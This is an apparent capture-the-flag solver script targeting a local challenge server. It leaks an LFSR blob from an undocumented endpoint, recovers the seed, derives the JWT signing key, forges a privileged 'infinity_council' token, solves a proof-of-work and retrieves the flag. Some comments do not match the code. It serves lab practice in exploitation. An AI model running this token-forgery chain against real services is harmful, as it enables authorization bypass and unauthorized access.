"""
C25 Solver — INFINITY ENGINE

This script automates the full exploitation chain:
1. Discover undocumented /sys/heartbeat endpoint to leak the LFSR blob.
2. Recover the 32-bit LFSR seed purely from the first 4 bytes of the output stream.
3. Reconstruct the JWT HMAC secret using the recovered SEED and exposed POLY.
4. Forge a JWT with the 'infinity_council' role to bypass authorization.
5. Solve the Proof-of-Work challenge.
6. Submit the PoW and token to /omega/retrieve to get the flag.
"""

import requests
import struct
import hmac
import hashlib
import jwt

TARGET = "http://localhost:5000"

def solve():
    print(f"[*] Targeting {TARGET}")
    
    # ---------------------------------------------------------
    # Stage 1: Leak BLOB from timing-vulnerable endpoint
    # ---------------------------------------------------------
    print("[*] Stage 1: Fetching binary blob from /sys/heartbeat")
    try:
        resp = requests.get(f"{TARGET}/sys/heartbeat", timeout=5)
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the server running?")
        return
        
    blob = resp.content
    if len(blob) < 80:
        print("[-] Invalid blob received")
        return
        
    # Extract structure
    magic    = struct.unpack(">I", blob[0:4])[0]
    seed_xor = struct.unpack(">I", blob[4:8])[0]
    poly     = struct.unpack(">I", blob[8:12])[0]
    stream_n = struct.unpack(">I", blob[12:16])[0]
    stream   = blob[16:16+stream_n]

    if magic != 0xDEADC0DE:
        print("[-] Magic mismatch")
        return

    print(f"[+] BLOB parsed. POLY: 0x{poly:08X}")

    # ---------------------------------------------------------
    # Stage 2: Recover SEED from LFSR Stream
    # ---------------------------------------------------------
    print("[*] Stage 2: Recovering LFSR seed in O(1)")
    # Since the LFSR outputs the lowest 8 bits of state, and shifts right by 1 each step,
    # the MSB of stream[i] gives us bit (7 + i) of the original seed.
    recovered_seed = stream[0]
    for i in range(1, 25):
        bit = (stream[i] & 0x80) >> 7
        recovered_seed |= (bit << (7 + i))

    print(f"[+] Recovered SEED: 0x{recovered_seed:08X}")

    # ---------------------------------------------------------
    # Stage 3: Forge JWT
    # ---------------------------------------------------------
    print("[*] Stage 3: Forging Authorization Token")
    jwt_key = hmac.new(
        struct.pack(">II", recovered_seed, poly), 
        b"INFINITY", 
        hashlib.sha256
    ).digest()
    
    token = jwt.encode({"data": {"role": "infinity_council"}}, jwt_key, algorithm="HS256")
    print(f"[+] Token generated: {token[:30]}...")

    # ---------------------------------------------------------
    # Stage 4: Solve Proof of Work
    # ---------------------------------------------------------
    print("[*] Stage 4: Fetching and solving PoW")
    resp = requests.get(f"{TARGET}/omega/challenge")
    ch_hex = resp.json().get("challenge")
    ch_bytes = bytes.fromhex(ch_hex)
    
    nonce = 0
    while True:
        h = hashlib.sha256(ch_bytes + nonce.to_bytes(4, 'big')).digest()
        if h[:2] == b'\x00\x00':
            break
        nonce += 1
        
    print(f"[+] PoW Solved. Nonce: {nonce}")

    # ---------------------------------------------------------
    # Stage 5: Retrieve Flag
    # ---------------------------------------------------------
    print("[*] Stage 5: Retrieving Flag")
    resp = requests.post(f"{TARGET}/omega/retrieve", json={
        "token": token,
        "challenge": ch_hex,
        "nonce": nonce
    })
    
    data = resp.json()
    if "flag" in data:
        print(f"\n[FLAG] {data['flag']}")
    else:
        print("[-] Failed to get flag:", data)

if __name__ == "__main__":
    solve()
